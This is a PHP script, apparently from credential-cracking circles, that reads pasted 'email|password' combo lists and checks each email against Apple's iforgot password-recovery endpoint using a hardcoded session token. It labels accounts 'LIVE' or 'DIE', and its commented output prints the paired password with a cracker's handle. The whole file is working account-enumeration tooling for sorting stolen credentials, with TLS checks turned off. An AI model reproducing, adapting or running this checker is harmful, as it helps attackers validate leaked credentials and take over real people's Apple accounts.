<?php
session_start();
error_reporting(0);
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
$xx = "|";
if(isset($_GET['emails']) && $xx)
{
    separar(trim($_GET['emails']), $xx);
}
function separar($emails, $xx){
$ab = split("\n", $emails);
$cb = count($ab);
for($x = 0; $x < $cb; $x++){
    list($email, $pass) = split("\\".$xx, $ab[$x]);
    testar($email, $pass);
    flush();
    ob_flush();
}
}
function getStr($string,$start,$end){
  $str = explode($start,$string);
  $str = explode($end,$str[1]);
  return $str[0];
}
function testar($email, $pass){
   $url = "https://iforgot.apple.com/password/verify/appleid";
   $post  = '{"id":"'.$email.'"}';
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    $request_headers = array();
    $request_headers[] = 'Content-Type: application/json';
    $request_headers[] = 'Accept: application/json, text/javascript, */*; q=0.01';
    $request_headers[] = 'Referer: https://iforgot.apple.com/password/verify/appleid?language=en_US';
    $request_headers[] = 'Accept-Language: en-US,en;q=0.8';
    $request_headers[] = 'sstt: ZK36UfiZl%2BMkdmEUyWWMd5Ax7illzxbftyasQ3a%2FNajGu7bGf9YJXKMI3Ri9ofOAROvrdrBrqJ5RTf2V%2FIaPMyVNGjvEfxKhqsHKfvENG41bKLtpbWi0uX%2Fj1o8LlFLRwU2cLOLnqWcIXIuCnaOZjiyTPK23Qi%2FI48MBQOsPK4v5XVqHrW694pdd4hfvKz6NHHm3Fv1OYcl96xBu6Sq%2FWA57U07to9OHvq2Sb%2B9QH%2BvrjMJs%2F6fK6HTUQo8CXm7W6Yp6dFR4sY8ifnJfuTfsgWyqLAZu%2F%2BFbdYKoi9w10Ll%2FrYK83SK3%2FCiD%2Bvs2SUmU8crAtCRZFFaB3xarK%2BF8D6nnfPAQot22oUeKlbSB73yWogyagEQN%2Fqu%2Bqi4f5Sxd3GjijzyFFLrLsTey';
    $request_headers[] = 'User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36';
    curl_setopt($curl, CURLOPT_HTTPHEADER, $request_headers);
  curl_setopt($curl, CURLOPT_COOKIESESSION, 1);
  curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
  curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
  curl_setopt($curl, CURLOPT_COOKIEJAR, 'cookies.txt');
  curl_setopt($curl, CURLOPT_COOKIEFILE,'cookies.txt');
  curl_setopt($curl, CURLOPT_VERBOSE, 1);
  curl_setopt($curl, CURLOPT_POST, 1);
  curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
    $result = curl_exec($curl);
    curl_close($curl);
    $xxx = json_decode($result);
    $live = $xxx->sstt;
    #echo $result;
    #echo $live;
  #return $result;
  if(strpos($result,$live) !== false){
    $array = array(
    'status' => "LIVE",
    'email' => $email,
    'message1' => "LIVE Checked");
    exit(json_encode($array));
    #echo "<font color='green'><b>LIVE -> $email:$pass ./BLACPRIV_27<b></font><br>";
  }else{
    $array = array(
    'status' => "DIE",
    'email' => $email,
    'message' => "DIE Checked");
    exit(json_encode($array));
    #echo "<font color='red'><b>DIE -> $email:$pass ./BLACPRIV_27<b></font><br>";
  }
}
?>